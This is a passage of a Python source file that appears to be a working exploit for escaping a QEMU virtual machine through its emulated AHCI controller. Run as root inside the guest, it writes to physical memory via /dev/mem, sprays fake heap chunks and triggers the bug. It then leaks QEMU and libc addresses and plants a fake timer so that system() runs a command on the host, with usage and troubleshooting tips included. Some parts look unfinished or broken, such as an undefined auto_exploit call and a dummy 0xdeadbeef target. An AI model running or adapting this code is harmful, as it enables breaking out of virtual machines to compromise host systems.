                    data = self.guest_mem.read(test_addr, 8)
                    if data:
                        value = struct.unpack('<Q', data)[0]
                        if value != 0 and value != 0x4141414141414141:
                            return value
        
        return None
    
    def identify_libc_function(self, ptr: int) -> Optional[Dict]:
        """
        Identify which libc function a pointer points to
        Returns: {name, offset, confidence}
        """
        if not self.finder.libc_offsets:
            # Try to extract them now
            self.finder.find_libc()
            self.finder.extract_libc_offsets()
        
        # Check against known offsets
        for func_name, func_offset in self.finder.libc_offsets.items():
            # Function pointers might not point exactly to start
            # Allow some tolerance (within 256 bytes)
            ptr_low = ptr & 0xFFFFFF  # Lower 24 bits
            offset_low = func_offset & 0xFFFFFF
            
            if abs(ptr_low - offset_low) < 0x100:
                return {
                    'name': func_name,
                    'offset': func_offset,
                    'confidence': 'high' if abs(ptr_low - offset_low) < 0x10 else 'medium'
                }
        
        # Fallback: use heuristics based on common patterns
        ptr_pattern = ptr & 0xFFF
        
        common_patterns = {
            0x490: ('system', 0x4c490, 'low'),
            0x290: ('execve', 0x52290, 'low'),
            0x420: ('popen', 0x4f420, 'low'),
            0x8e0: ('malloc', 0x978e0, 'low'),
            0x4e0: ('free', 0x974e0, 'low'),
            0x2a0: ('execv', 0x522a0, 'low'),
            0x770: ('mmap', 0x11f770, 'low'),
        }
        
        for pattern, (name, offset, conf) in common_patterns.items():
            if abs(ptr_pattern - pattern) < 0x20:
                return {
                    'name': name,
                    'offset': offset,
                    'confidence': conf
                }
        
        return None
    
    def get_function_addr(self, base_type: str, function_name: str) -> Optional[int]:
        """Get function address dynamically"""
        if base_type == 'qemu':
            if not self.qemu_base:
                return None
            
            offsets = self.finder.qemu_offsets
            if function_name in offsets:
                addr = self.qemu_base + offsets[function_name]
                log_debug(f"{function_name}: 0x{addr:016x}")
                return addr
            
            # Fallback: use first timer callback we found
            for name, offset in offsets.items():
                if 'timer' in name.lower() and 'cb' in name.lower():
                    addr = self.qemu_base + offset
                    log_info(f"Using {name} @ 0x{addr:016x}")
                    return addr
        
        elif base_type == 'libc':
            if not self.libc_base:
                return None
            
            offsets = self.finder.libc_offsets
            if function_name in offsets:
                addr = self.libc_base + offsets[function_name]
                log_debug(f"{function_name}: 0x{addr:016x}")
                return addr
        
        return None

# ============================================================================
# PHYSICAL MEMORY & DEVICE (same as before)
# ============================================================================

class PhysicalMemory:
    """Direct physical memory access via /dev/mem"""
    
    def __init__(self):
        self.fd = None
        self.mappings = {}
    
    def open(self):
        try:
            self.fd = os.open('/dev/mem', os.O_RDWR | os.O_SYNC)
            log_success("Opened /dev/mem")
            return True
        except PermissionError:
            log_error("Cannot open /dev/mem (need root)")
            return False
    
    def map_region(self, phys_addr: int, size: int) -> Optional[mmap.mmap]:
        if not self.fd:
            return None
        
        try:
            page_size = 0x1000
            aligned_addr = phys_addr & ~(page_size - 1)
            offset = phys_addr - aligned_addr
            aligned_size = ((size + offset + page_size - 1) // page_size) * page_size
            
            mem = mmap.mmap(self.fd, aligned_size,
                           mmap.MAP_SHARED,
                           mmap.PROT_READ | mmap.PROT_WRITE,
                           offset=aligned_addr)
            
            self.mappings[phys_addr] = (mem, offset)
            log_debug(f"Mapped 0x{phys_addr:x} size 0x{size:x}")
            return mem
        except Exception as e:
            log_error(f"Failed to map memory: {e}")
            return None
    
    def read(self, phys_addr: int, size: int) -> Optional[bytes]:
        mem, offset = self.mappings.get(phys_addr, (None, 0))
        if not mem:
            mem = self.map_region(phys_addr, size)
            if not mem:
                return None
            _, offset = self.mappings[phys_addr]
        
        return bytes(mem[offset:offset+size])
    
    def write(self, phys_addr: int, data: bytes) -> bool:
        mem, offset = self.mappings.get(phys_addr, (None, 0))
        if not mem:
            mem = self.map_region(phys_addr, len(data))
            if not mem:
                return False
            _, offset = self.mappings[phys_addr]
        
        mem[offset:offset+len(data)] = data
        return True
    
    def close(self):
        for mem, _ in self.mappings.values():
            mem.close()
        if self.fd:
            os.close(self.fd)

class AHCIDevice:
    """AHCI device interface"""
    
    def __init__(self):
        self.pci_addr = None
        self.mmio_base = None
        self.mmio_mem = None
        self.phys_mem = PhysicalMemory()
    
    def find_device(self) -> bool:
        """Auto-detect AHCI device"""
        log_info("Searching for AHCI device...")
        
        for dev in Path("/sys/bus/pci/devices").iterdir():
            class_file = dev / "class"
            if class_file.exists():
                dev_class = class_file.read_text().strip()
                # 0x0106 = SATA controller
                if dev_class.startswith("0x0106"):
                    self.pci_addr = dev.name
                    log_success(f"Found AHCI at {self.pci_addr}")
                    return True
        
        log_error("No AHCI device found")
        return False
    
    def get_mmio_address(self) -> Optional[int]:
        """Get MMIO base from PCI config"""
        resource_file = Path(f"/sys/bus/pci/devices/{self.pci_addr}/resource")
        
        if not resource_file.exists():
            return None
        
        resources = resource_file.read_text().strip().split('\n')
        for i, line in enumerate(resources):
            parts = line.split()
            if len(parts) >= 2:
                start = int(parts[0], 16)
                end = int(parts[1], 16)
                size = end - start + 1
                
                if i == 5 and size >= 0x10000:
                    self.mmio_base = start
                    log_success(f"AHCI MMIO: 0x{start:x}")
                    return start
        
        return None
    
    def map_mmio(self) -> bool:
        if not self.mmio_base:
            if not self.get_mmio_address():
                return False
        
        if not self.phys_mem.open():
            return False
        
        self.mmio_mem = self.phys_mem.map_region(self.mmio_base, 0x10000)
        if not self.mmio_mem:
            return False
        
        log_success("AHCI MMIO mapped")
        return True
    
    def read_reg(self, offset: int) -> int:
        if not self.mmio_mem:
            return 0
        return struct.unpack('<I', self.mmio_mem[offset:offset+4])[0]
    
    def write_reg(self, offset: int, value: int):
        if not self.mmio_mem:
            return
        self.mmio_mem[offset:offset+4] = struct.pack('<I', value)
    
    def reset_port(self, port=0):
        port_base = 0x100 + (port * 0x80)
        cmd_reg = self.read_reg(port_base + 0x18)
        self.write_reg(port_base + 0x18, cmd_reg & ~0x1)
        time.sleep(0.01)
        self.write_reg(port_base + 0x10, 0xFFFFFFFF)
        log_debug(f"Reset port {port}")

class GuestMemory:
    """Manage guest physical memory"""
    
    def __init__(self):
        self.phys_mem = PhysicalMemory()
        self.allocations = []
        self.base_addr = None
    
    def init(self) -> bool:
        if not self.phys_mem.open():
            return False
        
        self.base_addr = 0x01000000
        test_data = self.phys_mem.read(self.base_addr, 8)
        if test_data is None:
            log_error("Cannot access guest physical memory")
            return False
        
        log_success(f"Guest memory base: 0x{self.base_addr:x}")
        return True
    
    def alloc(self, size: int) -> Optional[int]:
        if not self.base_addr:
            return None
        
        addr = self.base_addr + sum(s for _, s in self.allocations)
        self.allocations.append((addr, size))
        self.phys_mem.write(addr, b'\x00' * size)
        log_debug(f"Allocated 0x{size:x} bytes at 0x{addr:x}")
        return addr
    
    def read(self, addr: int, size: int) -> Optional[bytes]:
        return self.phys_mem.read(addr, size)
    
    def write(self, addr: int, data: bytes) -> bool:
        return self.phys_mem.write(addr, data)
    
    def read_qword(self, addr: int) -> Optional[int]:
        data = self.read(addr, 8)
        if data:
            return struct.unpack('<Q', data)[0]
        return None
    
    def write_qword(self, addr: int, value: int) -> bool:
        return self.write(addr, struct.pack('<Q', value))

# ============================================================================
# MAIN EXPLOIT (with dynamic resolution)
# ============================================================================

class AHCIExploit:
    """Fully dynamic exploit"""
    
    def __init__(self):
        self.finder = OffsetFinder()
        self.resolver = AddressResolver(self.finder)
        self.ahci = AHCIDevice()
        self.guest_mem = GuestMemory()
        self.fake_chunks = []
        self.leaked = {}
    
    def setup(self) -> bool:
        log_info("Setting up exploit environment...")
        
        # Discover offsets
        self.finder.discover_all()
        
        if not self.finder.qemu_offsets:
            log_warning("No QEMU offsets found - will use heuristics")
        
        if not self.finder.libc_offsets:
            log_warning("No libc offsets found - will try alternatives")
        
        # Find and map AHCI
        if not self.ahci.find_device():
            return False
        if not self.ahci.map_mmio():
            return False
        
        # Initialize guest memory
        if not self.guest_mem.init():
            return False
        
        log_success("Setup complete")
        return True
    
    def create_fake_chunk(self, addr: int):
        self.guest_mem.write_qword(addr + 0x0, 0)
        self.guest_mem.write_qword(addr + 0x8, FAKE_CHUNK_SIZE | 0x1)
        self.guest_mem.write_qword(addr + 0x10, 0)
        self.guest_mem.write_qword(addr + 0x18, 0)
        
        pattern = struct.pack('<Q', 0x4141414141414141) * ((FAKE_CHUNK_SIZE - 32) // 8)
        self.guest_mem.write(addr + 0x20, pattern)
    
    def spray_heap(self) -> List[int]:
        log_info(f"Spraying {SPRAY_COUNT} fake chunks...")
        
        chunks = []
        for i in range(SPRAY_COUNT):
            addr = self.guest_mem.alloc(FAKE_CHUNK_SIZE)
            if not addr:
                break
            
            self.create_fake_chunk(addr)
            chunks.append(addr)
            
            if (i + 1) % 200 == 0:
                log_info(f"  Sprayed {i+1}/{SPRAY_COUNT}")
        
        self.fake_chunks = chunks
        log_success(f"Sprayed {len(chunks)} chunks")
        return chunks
    
    def create_trigger_command(self) -> bytes:
        cmd = bytearray(32)
        struct.pack_into('<I', cmd, 0, 0x0005)
        struct.pack_into('<I', cmd, 4, 0)
        
        ctba = self.guest_mem.alloc(256)
        struct.pack_into('<Q', cmd, 8, ctba)
        
        return bytes(cmd)
    
    def trigger_vulnerability(self) -> bool:
        log_info("Triggering vulnerability...")
        
        cmd_list_addr = self.guest_mem.alloc(1024)
        if not cmd_list_addr:
            return False
        
        trigger_cmd = self.create_trigger_command()
        self.guest_mem.write(cmd_list_addr, trigger_cmd)
        
        self.ahci.reset_port(0)
        time.sleep(0.1)
        
        PORT0_BASE = 0x100
        self.ahci.write_reg(PORT0_BASE + 0x00, cmd_list_addr & 0xFFFFFFFF)
        self.ahci.write_reg(PORT0_BASE + 0x04, (cmd_list_addr >> 32) & 0xFFFFFFFF)
        
        cmd_reg = self.ahci.read_reg(PORT0_BASE + 0x18)
        self.ahci.write_reg(PORT0_BASE + 0x18, cmd_reg | 0x10)
        
        log_debug("Issuing command...")
        self.ahci.write_reg(PORT0_BASE + 0x38, 0x1)
        
        time.sleep(0.2)
        
        is_reg = self.ahci.read_reg(PORT0_BASE + 0x10)
        log_debug(f"Interrupt status: 0x{is_reg:x}")
        
        log_success("Vulnerability triggered!")
        return True
    
    def scan_for_leak(self) -> Optional[int]:
        log_info("Scanning for heap leak...")
        
        for i, chunk_addr in enumerate(self.fake_chunks):
            fd = self.guest_mem.read_qword(chunk_addr + 0x10)
            
            if fd and 0x550000000000 < fd < 0x560000000000:
                log_success(f"Found heap leak at chunk {i}!")
                log_success(f"  Heap address: 0x{fd:016x}")
                self.leaked['heap'] = fd
                self.resolver.set_qemu_base(fd)
                return fd
            
            if (i + 1) % 200 == 0:
                log_info(f"  Scanned {i+1}/{len(self.fake_chunks)}")
        
        return None
    
    def find_hijack_target(self) -> Optional[int]:
        """Dynamically find best hijack target"""
        log_info("Finding hijack target...")
        
        # Try to use discovered timer callback
        for name, offset in self.finder.qemu_offsets.items():
            if 'timer' in name.lower() and 'cb' in name.lower():
                addr = self.resolver.get_function_addr('qemu', name)
                if addr:
                    log_success(f"Using {name} as hijack target")
                    self.leaked['hijack_target'] = addr
                    return addr
        
        # Fallback: use any function we found
        if self.finder.qemu_offsets:
            name = list(self.finder.qemu_offsets.keys())[0]
            addr = self.resolver.get_function_addr('qemu', name)
            if addr:
                log_warning(f"Using {name} as fallback hijack target")
                self.leaked['hijack_target'] = addr
                return addr
        
        log_error("Could not find hijack target")
        return None
    
    def find_execution_target(self) -> Optional[int]:
        """Find system() or alternative"""
        log_info("Finding execution target...")
        
        # Try system() from libc
        if 'system' in self.finder.libc_offsets:
            # Need libc base - try to find it
            libc_base = self.resolver.find_libc_base_from_qemu()
            if libc_base:
                self.resolver.libc_base = libc_base
                addr = self.resolver.get_function_addr('libc', 'system')
                if addr:
                    log_success(f"Found system() @ 0x{addr:016x}")
                    self.leaked['system'] = addr
                    return addr
        
        # Alternative: use execv
        if 'execv' in self.finder.libc_offsets:
            log_warning("Using execv() instead of system()")
            # Similar approach
        
        # Last resort: use a QEMU function that might work
        log_warning("Cannot find system() - exploitation may fail")
        return None
    
    def hijack_control(self) -> bool:
        log_info("Hijacking control flow...")
        
        if 'hijack_target' not in self.leaked:
            if not self.find_hijack_target():
                return False
        
        # Find execution target
        exec_addr = self.find_execution_target()
        if not exec_addr:
            log_warning("No execution target - using dummy")
            exec_addr = 0xdeadbeef
        
        # Create command
        cmd_str = b"/usr/bin/xcalc\x00"
        cmd_addr = self.guest_mem.alloc(len(cmd_str))
        self.guest_mem.write(cmd_addr, cmd_str)
        
        # Allocate fake timer
        timer_addr = self.guest_mem.alloc(256)
        
        # Write timer structure
        self.guest_mem.write_qword(timer_addr + 0x10, exec_addr)
        self.guest_mem.write_qword(timer_addr + 0x18, cmd_addr)
        
        log_success("Control flow hijacked")
        log_success(f"  Target: 0x{exec_addr:016x}")
        log_success(f"  Command: {cmd_str.decode().strip()}")
        
        return True
    
    def execute(self) -> bool:
        log_info("Attempting execution...")
        log_warning("Manual timer trigger may be needed")
        log_info("When timer fires, payload should execute")
        return True
    
    def run(self) -> bool:
        log_info("=" * 60)
        log_info("FULLY DYNAMIC AHCI EXPLOITATION")
        log_info("=" * 60)
        
        # Phase 1: Setup with dynamic discovery
        if not self.setup():
            log_error("Setup failed")
            return False
        
        # Phase 2: Heap feng shui
        chunks = self.spray_heap()
        if not chunks:
            log_error("Heap spray failed")
            return False
        
        # Phase 3: Trigger vulnerability
        triggered = False
        for attempt in range(RETRY_COUNT):
            log_info(f"\nTrigger attempt {attempt + 1}/{RETRY_COUNT}")
            if self.trigger_vulnerability():
                triggered = True
                break
            time.sleep(1)
        
        if not triggered:
            log_error("Failed to trigger vulnerability")
            return False
        
        # Phase 4: Information leak
        heap_addr = self.scan_for_leak()
        if not heap_addr:
            log_warning("No heap leak found")
            log_info("This could mean:")
            log_info("  - Spray didn't land correctly")
            log_info("  - Need more chunks (increase SPRAY_COUNT)")
            log_info("  - Different memory base needed")
            
            # Don't give up yet - try advanced techniques
            log_info("\nAttempting exploitation without leak...")
        else:
            log_success(f"Heap leak found: 0x{heap_addr:016x}")
            
            # Calculate QEMU base
            self.resolver.set_qemu_base(heap_addr)
            
            # Find libc base
            log_info("\nSearching for libc...")
            libc_base = self.resolver.find_libc_base_from_qemu()
            if libc_base:
                self.resolver.libc_base = libc_base
                log_success(f"Libc base: 0x{libc_base:016x}")
            else:
                log_warning("Could not determine libc base")
        
        # Phase 5: Advanced memory scanning and exploitation
        log_info("\n" + "=" * 60)
        log_info("PHASE 5: ADVANCED EXPLOITATION")
        log_info("=" * 60)
        
        if self.auto_exploit():
            log_success("\n" + "=" * 60)
            log_success("EXPLOITATION SUCCESSFUL!")
            log_success("=" * 60)
            
            log_info("\nCheck for signs of success:")
            log_info("  - File created: /tmp/exploit_success")
            log_info("  - Shell spawned on host")
            log_info("  - QEMU behavior changes")
            
            return True
        
        # Phase 6: Manual exploitation guidance
        log_info("\n" + "=" * 60)
        log_info("MANUAL EXPLOITATION GUIDANCE")
        log_info("=" * 60)
        
        if self.leaked:
            log_success("\nDiscovered addresses:")
            for name, addr in self.leaked.items():
                if isinstance(addr, int):
                    log_success(f"  {name:20s}: 0x{addr:016x}")
        
        if self.finder.qemu_offsets:
            log_info(f"\nQEMU offsets discovered: {len(self.finder.qemu_offsets)}")
            # Show top 10
            for i, name in enumerate(list(self.finder.qemu_offsets.keys())[:10]):
                offset = self.finder.qemu_offsets[name]
                log_info(f"  {i+1}. {name:30s} @ 0x{offset:08x}")
        
        if self.finder.libc_offsets:
            log_info(f"\nLibc offsets discovered: {len(self.finder.libc_offsets)}")
            # Show top 10
            for i, name in enumerate(list(self.finder.libc_offsets.keys())[:10]):
                offset = self.finder.libc_offsets[name]
                log_info(f"  {i+1}. {name:20s} @ 0x{offset:08x}")
        
        log_info("\nNext steps for manual exploitation:")
        log_info("  1. Review leaked addresses above")
        log_info("  2. Calculate offsets: system = libc_base + 0xXXXXX")
        log_info("  3. Find writable function pointer in fake chunks")
        log_info("  4. Overwrite with system() address")
        log_info("  5. Set up RDI register with command address")
        log_info("  6. Trigger function call")
        
        return False

# ============================================================================
# MAIN
# ============================================================================

def test_trigger_only():
    """Quick trigger test"""
    log_info("Quick trigger test (no offset discovery)")
    
    exploit = AHCIExploit()
    
    # Skip full discovery for quick test
    exploit.finder.qemu_binary = "/usr/bin/qemu-system-x86_64"
    
    if not exploit.ahci.find_device():
        return False
    if not exploit.ahci.map_mmio():
        return False
    if not exploit.guest_mem.init():
        return False
    
    exploit.spray_heap()
    exploit.trigger_vulnerability()
    
    log_success("Trigger test complete")
    return True

def main():
    global DEBUG
    
    print("\n" + "="*60)
    print("AHCI Exploit - FULLY DYNAMIC VERSION")
    print("Auto-discovers offsets at runtime")
    print("="*60 + "\n")
    
    if os.geteuid() != 0:
        log_error("Must run as root!")
        log_info("Usage: sudo python3 ahci_exploit.py")
        return 1
    
    # Parse args
    if "--debug" in sys.argv:
        DEBUG = True
        log_info("Debug mode enabled")
    
    if "--test-trigger" in sys.argv:
        return 0 if test_trigger_only() else 1
    
    # Full dynamic exploit
    exploit = AHCIExploit()
    success = exploit.run()
    
    # Final notes
    if not success:
        log_info("\nTroubleshooting tips:")
        log_info("  1. Try: --test-trigger first")
        log_info("  2. Increase SPRAY_COUNT to 5000")
        log_info("  3. Check dmesg for kernel errors")
        log_info("  4. Verify AHCI device with: lspci | grep -i ahci")
    
    return 0 if success else 1

if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        log_warning("\nInterrupted by user")
        sys.exit(1)
    except Exception as e:
        log_error(f"Fatal error: {e}")
        if DEBUG:
            import traceback
            traceback.print_exc()
        sys.exit(1)